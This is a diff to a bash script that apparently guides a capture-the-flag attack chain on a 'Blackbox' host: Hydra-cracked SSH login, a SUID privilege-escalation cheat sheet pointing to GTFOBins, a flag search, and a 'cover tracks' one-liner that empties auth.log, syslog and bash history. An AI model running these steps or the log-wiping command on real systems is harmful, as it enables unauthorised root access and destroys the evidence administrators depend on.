@@ -128,11 +128,37 @@ else
 fi
 
 # =============================================================
-# STAGE 4 — SSH INTO BLACKBOX
+# STAGE 4 — PRIVILEGE ESCALATION CHEAT SHEET
 # =============================================================
 echo ""
 echo -e "${CYAN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${RESET}"
-echo -e "${BOLD}${MAGENTA}  STAGE 3 — SSH Login${RESET}"
+echo -e "${BOLD}${MAGENTA}  STAGE 3 — Privilege Escalation Cheat Sheet${RESET}"
+echo -e "${CYAN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${RESET}"
+echo ""
+echo -e "  ${CYAN}►${RESET} ${BOLD}Step 1${RESET} — Find SUID binaries on the target:"
+echo -e "          ${YELLOW}find / -perm /4000 2>/dev/null${RESET}"
+echo ""
+echo -e "  ${CYAN}►${RESET} ${BOLD}Step 2${RESET} — Look for anything unusual in the list"
+echo -e "          Normal:     ${GREEN}passwd, sudo, su${RESET}"
+echo -e "          Suspicious: ${RED}nano, vim, find, python, bash${RESET}"
+echo ""
+echo -e "  ${CYAN}►${RESET} ${BOLD}Step 3${RESET} — Look up the binary on GTFOBins:"
+echo -e "          ${BOLD}${CYAN}https://gtfobins.github.io${RESET}"
+echo -e "          Search binary → click ${BOLD}SUID${RESET} tab → run the command"
+echo ""
+echo -e "  ${CYAN}►${RESET} ${BOLD}Step 4${RESET} — Find the flag once root:"
+echo -e "          ${YELLOW}find / -name flag.txt 2>/dev/null${RESET}"
+echo ""
+echo -e "  ${CYAN}►${RESET} ${BOLD}Step 5${RESET} — Cover tracks before exiting:"
+echo -e "          ${YELLOW}cat /dev/null > /var/log/auth.log; cat /dev/null > /var/log/syslog; cat /dev/null > ~/.bash_history; history -c${RESET}"
+echo -e "          Then type: ${BOLD}${GREEN}exit${RESET}"
+echo ""
+
+# =============================================================
+# STAGE 5 — SSH INTO BLACKBOX
+# =============================================================
+echo -e "${CYAN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${RESET}"
+echo -e "${BOLD}${MAGENTA}  STAGE 4 — SSH Login${RESET}"
 echo -e "${CYAN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${RESET}"
 echo ""
 echo -e "${YELLOW}[?] Enter cracked password from Hydra:${RESET}"
@@ -144,6 +170,7 @@ echo ""
 echo -e "${YELLOW}[?] Connect now? ${BOLD}(y/n)${RESET}${YELLOW}:${RESET}"
 read -r SSH_CONFIRM
 
+# --- sshpass check ---
 if ! command -v sshpass &> /dev/null; then
   echo -e "${YELLOW}[+] Installing sshpass...${RESET}"
   DEBIAN_FRONTEND=noninteractive apt-get install -y sshpass > /dev/null 2>&1
@@ -153,7 +180,7 @@ fi
 if [[ "$SSH_CONFIRM" == "y" || "$SSH_CONFIRM" == "Y" ]]; then
   echo ""
   echo -e "${MAGENTA}[>] Connecting to $TARGET as $USERNAME...${RESET}"
-  echo -e "${YELLOW}    Do your manual steps inside, then type exit to return.${RESET}"
+  echo -e "${YELLOW}    Cheat sheet is above — do your steps, then type exit.${RESET}"
   echo ""
   # Pre-accept host key
   ssh-keyscan -p "$SSH_PORT" "$TARGET" >> ~/.ssh/known_hosts 2>/dev/null
@@ -166,46 +193,10 @@ if [[ "$SSH_CONFIRM" == "y" || "$SSH_CONFIRM" == "Y" ]]; then
 fi
 
 # =============================================================
-# STAGE 5 — PRIVILEGE ESCALATION GUIDE
-# =============================================================
-echo ""
-echo -e "${CYAN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${RESET}"
-echo -e "${BOLD}${MAGENTA}  STAGE 4 — Privilege Escalation Reminder${RESET}"
-echo -e "${CYAN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${RESET}"
-echo ""
-echo -e "  ${CYAN}►${RESET} ${BOLD}Step 1${RESET} — Find SUID binaries on the target:"
-echo -e "          ${YELLOW}find / -perm /4000 2>/dev/null${RESET}"
-echo ""
-echo -e "  ${CYAN}►${RESET} ${BOLD}Step 2${RESET} — Look for anything unusual in the list"
-echo -e "          Normal:     ${GREEN}passwd, sudo, su${RESET}"
-echo -e "          Suspicious: ${RED}nano, vim, find, python, bash${RESET}"
-echo ""
-echo -e "  ${CYAN}►${RESET} ${BOLD}Step 3${RESET} — Look up the suspicious binary on GTFOBins:"
-echo -e "          ${BOLD}${CYAN}https://gtfobins.github.io${RESET}"
-echo -e "          Search the binary → click ${BOLD}SUID${RESET} tab → run the command"
-echo ""
-echo -e "  ${CYAN}►${RESET} ${BOLD}Step 4${RESET} — Find the flag once root:"
-echo -e "          ${YELLOW}find / -name flag.txt 2>/dev/null${RESET}"
-echo ""
-
-# =============================================================
-# STAGE 6 — COVER TRACKS REMINDER
-# =============================================================
-echo -e "${CYAN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${RESET}"
-echo -e "${BOLD}${RED}  STAGE 5 — Cover Tracks (run before exit)${RESET}"
-echo -e "${CYAN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${RESET}"
-echo ""
-echo -e "  ${CYAN}►${RESET} Run this one-liner ${BOLD}on the target as root${RESET} before exiting:"
-echo ""
-echo -e "  ${YELLOW}cat /dev/null > /var/log/auth.log; cat /dev/null > /var/log/syslog; cat /dev/null > ~/.bash_history; history -c${RESET}"
-echo ""
-echo -e "  ${CYAN}►${RESET} Then type: ${BOLD}${GREEN}exit${RESET}"
-echo ""
-
-# =============================================================
 # DONE
 # =============================================================
+echo ""
 echo -e "${CYAN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${RESET}"
-echo -e "${BOLD}${GREEN}  Script done — rest is manual. Good Hunting!${RESET}"
+echo -e "${BOLD}${GREEN}  Back on Kali — Blackbox Attack Chain Complete!${RESET}"
 echo -e "${CYAN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${RESET}"
 echo ""
